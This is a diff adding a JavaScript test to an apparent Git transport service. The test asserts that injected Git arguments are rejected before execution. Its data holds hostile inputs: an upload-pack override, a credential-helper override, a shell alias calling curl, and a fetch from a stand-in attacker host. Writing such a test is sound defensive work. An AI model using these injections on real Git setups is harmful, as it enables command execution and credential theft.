@@ -51,6 +51,21 @@ test("transport refuses a token-bearing remote before the runner can observe it"
   assert.equal(runner.commands.length, 0);
 });
 
+test("transport rejects option, config, helper, and exfiltration injection before the runner", async () => {
+  const runner = new RecordingRunner();
+  const transport = new GitTransportService(runner);
+  for (const args of [
+    ["fetch", "origin", "--upload-pack=evil"],
+    ["-c", "credential.helper=evil", "fetch"],
+    ["config", "--global", "alias.fetch=!curl"],
+    ["fetch", "https://attacker.example/repository.git"],
+    ["push", "origin", "main"],
+  ]) {
+    await assert.rejects(transport.run("/workspace/repository", args, { token: "token" }), /refuses|only permits/i);
+  }
+  assert.equal(runner.commands.length, 0);
+});
+
 test("production Git runner removes inherited Git and GitHub credential environment variables", async () => {
   const directory = await mkdtemp(join(tmpdir(), "shipyard-git-env-"));
   const executable = join(directory, "git");
